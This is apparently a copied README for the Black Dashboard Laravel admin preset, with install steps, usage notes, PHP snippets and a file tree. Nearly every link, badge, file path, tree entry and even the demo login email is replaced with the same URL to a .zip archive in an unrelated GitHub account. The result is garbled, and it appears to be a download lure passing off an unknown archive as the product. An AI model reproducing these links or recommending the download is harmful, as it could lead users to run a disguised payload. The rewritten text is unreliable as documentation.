# [Black Dashboard Laravel - Free Frontend Preset for Laravel](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) [![Tweet](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip%20Dashboard%20Laravel%20is%20a%20Free%20Frontend%20Preset%20for%20Laravel%20%E2%9D%A4%EF%B8%8F%0Ahttps%https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip%20%23%black%20%23design%20%23dashboard%20%23laravel%20%23free%20via%20%40CreativeTim)

![version](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) ![license](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) [![GitHub issues open](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip%3Aopen+is%3Aissue) [![GitHub issues closed](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip%3Aissue+is%3Aclosed)

*Frontend version*: Black Dashboard v1.0.0. More info at https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip

[<img src="https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip" width="100%" />](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) 

Speed up your web development with the Bootstrap 4 Admin Dashboard built for Laravel Framework 9.x and up.

If you want to get more features, go PRO with [Black Dashboard PRO Laravel](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip).

## Note

We recommend installing this preset on a project that you are starting from scratch, otherwise your project's design might break.

## Prerequisites

If you don't already have an Apache local environment with PHP and MySQL, use one of the following links:

 - Windows: https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
 - Linux: https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
 - Mac: https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip

Also, you will need to install Composer: https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip

And Laravel: https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip

## Installation

After initializing a fresh instance of Laravel (and making all the necessary configurations), install the preset using one of the provided methods:

### Via composer

1. `Cd` to your Laravel app  
2. Type in your terminal: `composer require laravel/ui` and `php artisan ui vue --auth`
2. Install this preset via `composer require laravel-frontend-presets/black-dashboard`. No need to register the service provider. Laravel 5.5 & up can auto detect the package.
3. Run `php artisan ui black` command to install the Argon preset. This will install all the necessary assets and also the custom auth views, it will also add the auth route in `https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip`
(NOTE: If you run this command several times, be sure to clean up the duplicate Auth entries in https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)
4. In your terminal run `composer dump-autoload`
5. Run `php artisan migrate --seed` to create basic users table

### By using the archive

1. In your application's root create a **presets** folder
2. [Download an archive](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) of the repo and unzip it
3. Copy and paste **black-dashboard-master** folder in presets (created in step 2) and rename it to **black**
4. Open `https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip` file 
5. Add `"LaravelFrontendPresets\\BlackPreset\\": "presets/black/src"` to `autoload/psr-4` and to `autoload-dev/psr-4`
6. Add `LaravelFrontendPresets\BlackPreset\BlackPresetServiceProvider::class` to `https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip` file
7. Type in your terminal: `composer require laravel/ui` and `php artisan ui vue --auth`
8. In your terminal run `composer dump-autoload`
9. Run `php artisan ui black` command to install the Black Dashboard preset. This will install all the necessary assets and also the custom auth views, it will also add the auth route in `https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip`
(NOTE: If you run this command several times, be sure to clean up the duplicate Auth entries in https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)
10. Run `php artisan migrate --seed` to create basic users table


## Usage

Register a user or login using **https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip** and **secret** and start testing the preset (make sure to run the migrations and seeders for these credentials to be available).

Besides the dashboard and the auth pages this preset also has an edit profile page. All the necessary files (controllers, requests, views) are installed out of the box and all the needed routes are added to `https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip`. Keep in mind that all of the features can be viewed once you login using the credentials provided above or by registering your own user. 

### Dashboard

You can access the dashboard either by using the "**Dashboard**" link in the left sidebar or by adding **/home** in the url. 

### Profile edit

You have the option to edit the current logged in user's profile (change name, email and password). To access this page just click the "**User profile**" link in the left sidebar or by adding **/profile** in the url.

The `App\Http\Controllers\ProfileController` handles the update of the user information. 

```
public function update(ProfileRequest $request)
{
    auth()->user()->update($request->all());

    return back()->withStatus(__('Profile successfully updated.'));
}
```

Also you shouldn't worry about entering wrong data in the inputs when editing the profile, validation rules were added to prevent this (see `App\Http\Requests\ProfileRequest`). If you try to change the password you will see that other validation rules were added in `App\Http\Requests\PasswordRequest`. Notice that in this file you have a custom validation rule that can be found in `App\Rules\CurrentPasswordCheckRule`.

```
public function rules()
{
    return [
        'old_password' => ['required', 'min:6', new CurrentPasswordCheckRule],
        'password' => ['required', 'min:6', 'confirmed', 'different:old_password'],
        'password_confirmation' => ['required', 'min:6'],
    ];
}
```
## Table of Contents

* [Versions](#versions)
* [Demo](#demo)
* [Documentation](#documentation)
* [File Structure](#file-structure)
* [Browser Support](#browser-support)
* [Resources](#resources)
* [Reporting Issues](#reporting-issues)
* [Licensing](#licensing)
* [Useful Links](#useful-links)

## Versions

[<img src="https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip" width="60" height="60" />](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)
[<img src="https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip" width="60" height="60" />](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)

| HTML | LARAVEL |
| --- | --- |
| [![Black Dashboard HTML](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) | [![Black Dashboard Laravel](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)

## Demo

| Register | Login | Dashboard |
| --- | --- | ---  |
| [![Register](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)  | [![Login](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)  | [![Dashboard](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)

| Profile Page | Users Page | Tables Page  |
| --- | --- | ---  |
| [![Profile Page](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)  | [![Users Page](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) | [![Tables Page](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)
[View More](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)

## Documentation
The documentation for the Black Dashboard Laravel is hosted at our [website](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip).

## File Structure
```
├───app
│   ├───Http
│   │   ├───Controllers
│   │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
│   │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
│   │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
│   │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
│   │   │       
│   │   └───Requests
│   │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
│   │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
│   │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
│   │           
│   └───Rules
│           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
│           
├───database
│   └───seeds
│           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
│           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
│           
└───resources
    ├───assets
    │   ├───css
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       
    │   ├───demo
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       
    │   ├───fonts
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       
    │   ├───img
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │       
    │   ├───js
    │   │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │   │   
    │   │   ├───core
    │   │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │   │       
    │   │   └───plugins
    │   │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │   │           
    │   └───scss
    │       │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │       │   
    │       └───black-dashboard
    │           ├───bootstrap
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   
    │           │   ├───mixins
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       
    │           │   └───utilities
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           
    │           ├───custom
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │   
    │           │   ├───cards
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       
    │           │   ├───mixins
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
